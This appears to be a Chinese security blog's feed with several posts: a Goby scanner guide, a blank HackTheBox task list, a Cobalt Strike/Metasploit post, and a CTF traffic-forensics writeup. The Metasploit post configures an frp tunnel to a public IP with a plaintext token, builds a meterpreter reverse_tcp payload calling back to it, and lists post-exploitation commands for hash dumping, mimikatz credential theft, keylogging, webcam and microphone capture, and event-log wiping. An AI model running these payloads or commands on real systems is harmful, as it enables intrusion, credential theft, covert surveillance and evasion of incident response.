        <content type="html"><![CDATA[<h1 id="Goby安装与使用"><a href="#Goby安装与使用" class="headerlink" title="Goby安装与使用"></a>Goby安装与使用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>Goby是一款基于网络空间测绘技术的新一代网络安全工具，它通过给目标网络建立完整的资产知识库，进行网络安全事件应急与漏洞应急。</p><p>Goby可提供最全面的资产识别，目前预置了超过10万种规则识别引擎，能够针对硬件设备和软件业务系统进行自动化识别和分类，全面的分析出网络中存在的业务系统。Goby可提供最快速对目标影响最小的扫描体验，通过非常轻量级地发包能够快速的分析出端口对应的协议信息。Goby也为安全带来了高效，Goby预置了最具攻击效果的漏洞引擎，覆盖Weblogic，Tomcat等最严重漏洞。并且每日更新会被用于真实攻击的漏洞。</p><h3 id="Goby安装与下载"><a href="#Goby安装与下载" class="headerlink" title="Goby安装与下载"></a><strong>Goby安装与下载</strong></h3><p>Goby下载路径为：<a href="https://gobies.org/">https://gobies.org/</a></p><blockquote><p>如果是windows的系统首先要下载一个数据包捕获库<br>目前npcap-0.9995.exe支持Windows Vista/2008, 7/2008R2, 8/2012, 8.1/2012R2, 10/2016 (x86 and x64)的系统，如果是win11可能会有问题<br><a href="https://nmap.org/npcap/dist/npcap-0.9995.exe">https://nmap.org/npcap/dist/npcap-0.9995.exe</a><br>下载完npcap-0.9995.exe，运行程序，紧接着我是勾选了四个选项，默认是有三个勾选，等待安装成功</p></blockquote><h3 id="goby使用"><a href="#goby使用" class="headerlink" title="goby使用"></a><strong>goby使用</strong></h3><blockquote><p>点击右上角加号，填写目标ip，要返回数据的ip，点击开启扫描</p></blockquote><p>当你扫描出漏洞时，在漏洞界面会生成你扫描出的漏洞信息，点击poc管理可以点击扫描的标志进行单个漏洞扫描，出现风险为Y时，便是有这个漏洞，并且在poc管理中，可以自己制定poc扫描，可以是一些出现过的漏洞poc</p><p>资产生成报告，这一功能会将扫描完的信息生成一个报告，对目标ip进行风险等级评估分析等</p><p>扩展扫描程序，可以下载一些已知的扫描器爬虫等扩展程序用于配合goby对企业漏洞进行扫描，对快速发现企业中隐藏漏洞有积极的作用</p><p>扫描过获得的全部资产，快速整理出扫描过的目标企业资产</p>]]></content>
      
      
      <categories>
          
          <category> 红队工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Goby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox 小记</title>
      <link href="/posts/1dbb.html"/>
      <url>/posts/1dbb.html</url>
      
        <content type="html"><![CDATA[<h1 id="HACKERTHEBOX"><a href="#HACKERTHEBOX" class="headerlink" title="HACKERTHEBOX"></a>HACKERTHEBOX</h1><h2 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h2><h3 id="TASK1"><a href="#TASK1" class="headerlink" title="TASK1"></a>TASK1</h3><p>What does the acronym VM stand for?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="TASK-2"><a href="#TASK-2" class="headerlink" title="TASK 2"></a>TASK 2</h3><p>What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It’s also known as a console or shell.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="TASK3"><a href="#TASK3" class="headerlink" title="TASK3"></a>TASK3</h3><p>What service do we use to form our VPN connection into HTB labs?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="TASK4"><a href="#TASK4" class="headerlink" title="TASK4"></a>TASK4</h3><p>What tool do we use to test our connection to the target with an ICMP echo request?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="TASK-5"><a href="#TASK-5" class="headerlink" title="TASK 5"></a>TASK 5</h3><p>What is the name of the most common tool for finding open ports on a target?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="TASK-6"><a href="#TASK-6" class="headerlink" title="TASK 6"></a>TASK 6</h3><p>What service do we identify on port 23/tcp during our scans?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="TASK-7"><a href="#TASK-7" class="headerlink" title="TASK 7"></a>TASK 7</h3><p>What username is able to log into the target over telnet with a blank password?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="SUBMIT-FLAG"><a href="#SUBMIT-FLAG" class="headerlink" title="SUBMIT FLAG"></a>SUBMIT FLAG</h3><p>Submit root flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs msf联动</title>
      <link href="/posts/e1e1.html"/>
      <url>/posts/e1e1.html</url>
      
        <content type="html"><![CDATA[<h2 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h2><p>download</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://kgithub.com/fatedier/frp/releases/download/v0.33.0/frp_0.33.0_linux_amd64.tar.gz </span><br><span class="line">tar -zxvf frp_0.33.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure><p>frps.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line"># frp监听的端口，默认是7000，可以改成其他的</span><br><span class="line">bind_port = 7000</span><br><span class="line"># 授权码，请改成更复杂的</span><br><span class="line">token = zhaobohong1</span><br><span class="line"># 这个token之后在客户端会用到</span><br><span class="line"></span><br><span class="line"># frp管理后台端口，请按自己需求更改</span><br><span class="line">dashboard_port = 7500</span><br><span class="line"></span><br><span class="line"># frp管理后台用户名和密码，请改成自己的</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = zhaobohong1</span><br><span class="line">enable_prometheus = true</span><br><span class="line"></span><br><span class="line"># frp日志配置</span><br><span class="line">log_file = /var/log/frps.log</span><br><span class="line">log_level = info</span><br><span class="line">log_max_days = 3</span><br></pre></td></tr></table></figure><p>frpc.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 162.14.67.177</span><br><span class="line">server_port = 7000</span><br><span class="line">token = zhaobohong1</span><br><span class="line"># 以上为frp服务器信息</span><br><span class="line"></span><br><span class="line"># 以下为本地内网客户端信息</span><br><span class="line">[MSF]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 0.0.0.0</span><br><span class="line">local_port = 8050</span><br><span class="line">remote_port = 8050</span><br></pre></td></tr></table></figure><p>设置frp服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/frp </span><br><span class="line">sudo cp frps.ini /etc/frp </span><br><span class="line">sudo cp frps /usr/bin </span><br><span class="line">sudo cp systemd/frps.service /usr/lib/systemd/system/ </span><br><span class="line">sudo systemctl enable frps </span><br><span class="line">sudo systemctl start frps</span><br></pre></td></tr></table></figure><h2 id="msf生成raw"><a href="#msf生成raw" class="headerlink" title="msf生成raw"></a>msf生成raw</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=162.14.67.177 LPORT=8050 -f raw -o beacon.bin</span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set playload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8050</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>若要和cs联动，回到cs上 用Spawn 派生会话到msf</p><h2 id="后渗透meterpreter使用"><a href="#后渗透meterpreter使用" class="headerlink" title="后渗透meterpreter使用"></a>后渗透meterpreter使用</h2><p>Metasploit中的Meterpreter模块在后渗透阶段具有强大的攻击力。</p><h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 进入会话</span><br><span class="line">sessions -k 杀死会话</span><br><span class="line">pwd         查看当前目录</span><br><span class="line">getuid      查看当前用户信息</span><br><span class="line">sysinfo     查看远程主机系统信息</span><br><span class="line">execute     在目标主机上执行命令</span><br><span class="line">hashdump    获取目标主机用户密码hash信息（只要我们能够获取到目标的用户凭证，那么即使目标修补了漏洞，我们还是可以控制目标）</span><br><span class="line">getsystem   提升权限（通过内置的提权组件来尝试获取到系统权限）</span><br><span class="line">shell       切换至传统shell</span><br><span class="line">background  将当前session放入后台</span><br><span class="line">kill        关闭进程</span><br><span class="line">load        加载meterpreter扩展</span><br><span class="line">exit        退出当前shell</span><br><span class="line">arp         显示ARP缓存</span><br><span class="line">getproxy    显示当前代理配置</span><br><span class="line">ifconfig    显示接口</span><br><span class="line">ipconfig    显示接口</span><br><span class="line">netstat     显示网络连接</span><br><span class="line">portfwd     将本地端口转发到远程服务</span><br><span class="line">route       查看和修改路由</span><br><span class="line">getenv      查看环境变量</span><br><span class="line">getprivs    查看权限</span><br><span class="line">pgrep       搜索进程</span><br><span class="line">ps          查看当前运行进程（主要查看有没有杀软，可以通过在线杀软对比来确定）</span><br><span class="line">reboot      重启系统</span><br><span class="line">reg         修改注册表</span><br><span class="line">help        查看相关的命令</span><br><span class="line">migrate     进程迁移（主要是防止当前的会话断开，所以尽快迁移到其他稳定的进程当中去，要注意两点：迁移的进程位数要一致，迁移的权限最好一致）</span><br><span class="line">clearev     清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure><h3 id="File-system-Commands"><a href="#File-system-Commands" class="headerlink" title="File system Commands"></a>File system Commands</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cat     查看文件</span><br><span class="line">cd      更改目录</span><br><span class="line">checksum   检索文件的校验和</span><br><span class="line">cp      拷贝文件</span><br><span class="line">dir      列出文件</span><br><span class="line">download   下载文件</span><br><span class="line">edit     编辑文件</span><br><span class="line">getlwd    打印本地工作目录</span><br><span class="line">getwd     打印工作目录</span><br><span class="line">lcd      更改本地工作目录</span><br><span class="line">lls      列出本地文件</span><br><span class="line">lpwd     打印本地工作目录</span><br><span class="line">ls      列表文件</span><br><span class="line">mkdir     制作目录</span><br><span class="line">mv      将源头移动到目的地</span><br><span class="line">pwd      打印工作目录</span><br><span class="line">rm      删除指定的文件</span><br><span class="line">rmdir     删除目录</span><br><span class="line">search    搜索文件</span><br><span class="line">show_mount  列出所有挂载点/逻辑驱动器</span><br><span class="line">upload    上传文件或目录</span><br></pre></td></tr></table></figure><h3 id="用户设备命令"><a href="#用户设备命令" class="headerlink" title="用户设备命令"></a>用户设备命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops   列出所有可访问的桌面和窗口</span><br><span class="line">getdesktop     获取当前桌面</span><br><span class="line">idletime       获取远程系统已运行时间（从上次重新启动开始计算）</span><br><span class="line">keyboard_send  发送击键</span><br><span class="line">keyscan_dump   转储击键缓冲区</span><br><span class="line">keyscan_start  开始捕获击键</span><br><span class="line">keyscan_stop   停止捕获击键</span><br><span class="line">mouse          发送鼠标事件</span><br><span class="line">screenshare    实时观看远程用户的桌面</span><br><span class="line">screenshot     截屏</span><br><span class="line">setdesktop     更改shell当前桌面</span><br><span class="line">record_mic     记录麦克风一定秒数</span><br><span class="line">webcam_chat    开始视频聊天</span><br><span class="line">webcam_list    列出网络摄像头</span><br><span class="line">webcam_snap    从指定网络摄像头拍摄</span><br><span class="line">webcam_stream  播放指定网络摄像头的视频流</span><br><span class="line">play           在目标系统播放音频</span><br></pre></td></tr></table></figure><h3 id="uictl开关键盘-鼠标"><a href="#uictl开关键盘-鼠标" class="headerlink" title="uictl开关键盘/鼠标"></a>uictl开关键盘/鼠标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uictl [enable/disable] [keyboard/mouse/all] 开启或禁止键盘/鼠标 </span><br><span class="line">uictl disable mouse</span><br><span class="line">uictl disable keyboard</span><br></pre></td></tr></table></figure><h3 id="webcam摄像头命令"><a href="#webcam摄像头命令" class="headerlink" title="webcam摄像头命令"></a>webcam摄像头命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list 查看摄像头列表</span><br><span class="line">webcam_snap -i 1 从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream -i 1 播放指定网络摄像头的视频流</span><br></pre></td></tr></table></figure><h3 id="execute执行文件"><a href="#execute执行文件" class="headerlink" title="execute执行文件"></a>execute执行文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute 在目标机中执行文件 </span><br><span class="line">execute -H -i -f Calc.exe 创建新进程cmd.exe，-H不可见，-i交互</span><br></pre></td></tr></table></figure><h3 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz   加载mimikatz模块</span><br><span class="line">help mimikatz   查看帮助</span><br><span class="line">wdigest         获取密码</span><br></pre></td></tr></table></figure><h3 id="远程桌面-amp-截屏"><a href="#远程桌面-amp-截屏" class="headerlink" title="远程桌面&amp;截屏"></a>远程桌面&amp;截屏</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops 查看可用的桌面 </span><br><span class="line">getdesktop 获取当前meterpreter关联的桌面 </span><br><span class="line">set_desktop 设置meterpreter关联的桌面 -h查看帮助 </span><br><span class="line">screenshot 截屏 </span><br><span class="line">use espia 或者使用espia模块截屏 然后输入screengrab </span><br><span class="line">run vnc 使用vnc远程桌面连接</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frp </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 第二届陇剑杯-Writeup</title>
      <link href="/posts/15a8.html"/>
      <url>/posts/15a8.html</url>
      
        <content type="html"><![CDATA[<h1 id="HW"><a href="#HW" class="headerlink" title="HW"></a>HW</h1><h2 id="hard-web-1"><a href="#hard-web-1" class="headerlink" title="hard_web_1"></a>hard_web_1</h2><p>过滤器:ip.dst == 192.168.162.188 and tcp.connection.synack</p><p>一个一个看，能看到 <code>80, 888, 8888</code></p><h2 id="hard-web-2"><a href="#hard-web-2" class="headerlink" title="hard_web_2"></a>hard_web_2</h2><p>先执行第一次脚本，在返回包24208得到了key为xc</p><h1 id="SS"><a href="#SS" class="headerlink" title="SS"></a>SS</h1><h2 id="sevrer-save-1"><a href="#sevrer-save-1" class="headerlink" title="sevrer save_1"></a>sevrer save_1</h2><p><img src="https://s2.loli.net/2023/08/26/cr2NQtLCXeTophH.png" alt="image-20230826105433338"></p><p>发现playload，去搜一下发现是spring Framework RCE(CVE-2022-22965)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2022-22965</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-2"><a href="#sevrer-save-2" class="headerlink" title="sevrer save_2"></a>sevrer save_2</h2><p><img src="https://s2.loli.net/2023/08/26/tziXH652abDxAOC.png" alt="image-20230826105731570"></p><p>流量包内发现反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.128:2333</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-3"><a href="#sevrer-save-3" class="headerlink" title="sevrer save_3"></a>sevrer save_3</h2><p><img src="https://s2.loli.net/2023/08/27/WXY8w6E2hyqjsti.png" alt="image-20230827153939218"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-4"><a href="#sevrer-save-4" class="headerlink" title="sevrer save_4"></a>sevrer save_4</h2><p><img src="https://s2.loli.net/2023/08/27/eLxmj967OadWuUz.png" alt="image-20230827154111314"></p><p>在/etc/shadow内发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll:123456</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-5"><a href="#sevrer-save-5" class="headerlink" title="sevrer save_5"></a>sevrer save_5</h2><p><img src="https://s2.loli.net/2023/08/27/kSKE9gh4GBCAtFM.png" alt="image-20230827154256267"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.105.202.239</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-6"><a href="#sevrer-save-6" class="headerlink" title="sevrer save_6"></a>sevrer save_6</h2><p><img src="https://s2.loli.net/2023/08/27/G36EPXyLDBgmvJC.png" alt="image-20230827154326045"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lolMiner,mine_doge.sh</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-7"><a href="#sevrer-save-7" class="headerlink" title="sevrer save_7"></a>sevrer save_7</h2><p>在guest目录下发现POOL地址</p><p><img src="https://s2.loli.net/2023/08/26/2ZBdPSbOaezWXDl.png" alt="image-20230826112125666"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doge.millpools.cc:5567</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-8"><a href="#sevrer-save-8" class="headerlink" title="sevrer save_8"></a>sevrer save_8</h2><p>上图也发现了WALLET地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9</span><br></pre></td></tr></table></figure><h1 id="WS"><a href="#WS" class="headerlink" title="WS"></a>WS</h1><h2 id="Wireshark1-1"><a href="#Wireshark1-1" class="headerlink" title="Wireshark1_1"></a>Wireshark1_1</h2><p><img src="https://s2.loli.net/2023/08/26/qClXIASsu5B1op6.png" alt="image-20230826103759891"></p><p>destination为192.168.246.28</p><h2 id="Wireshark1-2"><a href="#Wireshark1-2" class="headerlink" title="Wireshark1_2"></a>Wireshark1_2</h2><p><img src="https://s2.loli.net/2023/08/26/3Nf4ix6qPFsAkmQ.png" alt="image-20230826103955137"></p><p>追踪tcp流发现密码口令youcannevergetthis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youcannevergetthis</span><br></pre></td></tr></table></figure><h2 id="Wireshark1-3"><a href="#Wireshark1-3" class="headerlink" title="Wireshark1_3"></a>Wireshark1_3</h2><p><img src="https://s2.loli.net/2023/08/26/Z8IvXbdFesMS3pE.png" alt="image-20230826104244247"></p><p>ls目录看到第二个文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Downloads</span><br></pre></td></tr></table></figure><h2 id="Wireshark1-4"><a href="#Wireshark1-4" class="headerlink" title="Wireshark1_4"></a>Wireshark1_4</h2><p><img src="https://s2.loli.net/2023/08/26/VQFxtYONZL6peRH.png" alt="image-20230826104618028"></p><p>明文mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure><h1 id="SSW"><a href="#SSW" class="headerlink" title="SSW"></a>SSW</h1><h2 id="SmallSword-1"><a href="#SmallSword-1" class="headerlink" title="SmallSword_1"></a>SmallSword_1</h2><p><img src="https://s2.loli.net/2023/08/26/FDrfue9VnIPY46y.png" alt="image-20230826155402330"></p><p>了解一下蚁剑流量特点，直接得到webshell的密码。</p><h2 id="SmallSword-2"><a href="#SmallSword-2" class="headerlink" title="SmallSword_2"></a>SmallSword_2</h2><p>分析流量发现向hacker.txt内写入了数据，base64解码得到数据ad6269b7-3ce2-4ae8-b97f-f259515e7a91</p><p><img src="https://s2.loli.net/2023/08/26/wWuozNAVKPl172j.png" alt="image-20230826161228875"></p><h2 id="SmallSword-3"><a href="#SmallSword-3" class="headerlink" title="SmallSword_3"></a>SmallSword_3</h2><p>把http对象全部导出来，发现一个奇怪的php文件5MB。打不开，010发现其为exe文件。</p><p><img src="https://s2.loli.net/2023/08/27/2tbSZ8QnUJXEKai.png" alt="image-20230827162026709"></p><p>删掉 <code>2D 3E 7C</code> ，后缀名改为 <code>exe</code></p><p><img src="https://s2.loli.net/2023/08/27/r3ZiWRjSqAkbnmQ.png" alt="image-20230827162356121"></p><p>上一层看到了一张test.jpg</p><p><img src="https://s2.loli.net/2023/08/27/2cNbU65tSzqBloA.png" alt="image-20230827162522788"></p><p>发现其为png图片。</p><p><img src="https://s2.loli.net/2023/08/27/GtkTjSc8pOeJAh5.png" alt="image-20230827162601470"></p><p>改后缀拉入010，可以看到CRC错误。</p><p><img src="https://s2.loli.net/2023/08/27/28npNQaJkXKCfhu.png" alt="image-20230827162747922"></p><p>CRC脚本爆破其原本宽高。</p><p><img src="https://s2.loli.net/2023/08/27/bvzyp1RTG6rAx7m.png" alt="image-20230827165554185"></p><p><img src="https://s2.loli.net/2023/08/27/hLoGFWOnYtjw8pe.png" alt="image-20230827165612241"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag3&#123;8f0dffac-5801-44a9-bd49-e66192ce4f57&#125;</span><br></pre></td></tr></table></figure><h1 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h1><h2 id="ez-web-1"><a href="#ez-web-1" class="headerlink" title="ez_web_1"></a>ez_web_1</h2><p><img src="https://s2.loli.net/2023/08/27/lky5uDt2pW16Las.png" alt="image-20230827155101475"></p><p>自带的是 <code>ViewMore.php</code>，这个php正在上传 <code>d00r.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ViewMore.php</span><br></pre></td></tr></table></figure><h2 id="ez-web-2"><a href="#ez-web-2" class="headerlink" title="ez_web_2"></a>ez_web_2</h2><p>发现流量包内有ifconfig查询本机ip，返回包发现内网ip。</p><p><img src="https://s2.loli.net/2023/08/26/tRN4c3EJIhBXevM.png" alt="image-20230826165609533"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.101.132</span><br></pre></td></tr></table></figure><h2 id="ez-web-3"><a href="#ez-web-3" class="headerlink" title="ez_web_3"></a>ez_web_3</h2><p>发现file_put_content了一个key文件</p><p><img src="https://s2.loli.net/2023/08/26/uWTyJcHZYXMpkN6.png" alt="image-20230826170313412"></p><p>base64解码发现其是zip压缩包，010导出对应压缩包发现需要密码。</p><p><img src="https://s2.loli.net/2023/08/26/YLQXKgAdE2CDyto.png" alt="image-20230826170917639"></p><p>在流量包内有cat /passwd，是其解压密码。</p><p><img src="https://s2.loli.net/2023/08/26/4KdOG189jWsiwU5.png" alt="image-20230826171502386"></p><p>得到key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7d9ddff2-2d67-4eba-9e48-b91c26c42337</span><br></pre></td></tr></table></figure><h1 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h1><h2 id="baby-forensics-1"><a href="#baby-forensics-1" class="headerlink" title="baby_forensics_1"></a>baby_forensics_1</h2><p>rot47编码。解码即可2e80307085fd2b5c49c968c323ee25d5。</p><h2 id="baby-forensics-2"><a href="#baby-forensics-2" class="headerlink" title="baby_forensics_2"></a>baby_forensics_2</h2><h2 id="baby-forensics-3"><a href="#baby-forensics-3" class="headerlink" title="baby_forensics_3"></a>baby_forensics_3</h2><h1 id="HD"><a href="#HD" class="headerlink" title="HD"></a>HD</h1><h2 id="hacked-1"><a href="#hacked-1" class="headerlink" title="hacked_1"></a>hacked_1</h2><p>username和password经过aes加密，key和iv在js内已知，cbc模式。登录流量包解密就能拿到密码flag{WelC0m5_TO_H3re}</p><p><img src="https://s2.loli.net/2023/08/26/giprX9ATGqhF7U8.png" alt="image-20230826173954478"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;WelC0m5_TO_H3re&#125;</span><br></pre></td></tr></table></figure><h2 id="hacked-2"><a href="#hacked-2" class="headerlink" title="hacked_2"></a>hacked_2</h2><p>直接搜secret，发现流量包，全是html实体，解码得到SECRET_KEY。</p><p><img src="https://s2.loli.net/2023/08/27/5bVMTZCrRxhfOiq.png" alt="image-20230827160044644"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti_flask_hsfvaldb</span><br></pre></td></tr></table></figure><h2 id="hacked-3"><a href="#hacked-3" class="headerlink" title="hacked_3"></a>hacked_3</h2><p><img src="https://s2.loli.net/2023/08/27/cR4VtwC3kNDeoIO.png" alt="image-20230827160710510"></p><p>tcp流76，解码</p><h2 id="hacked-4"><a href="#hacked-4" class="headerlink" title="hacked_4"></a>hacked_4</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-SSTI</title>
      <link href="/posts/9e9b.html"/>
      <url>/posts/9e9b.html</url>
      
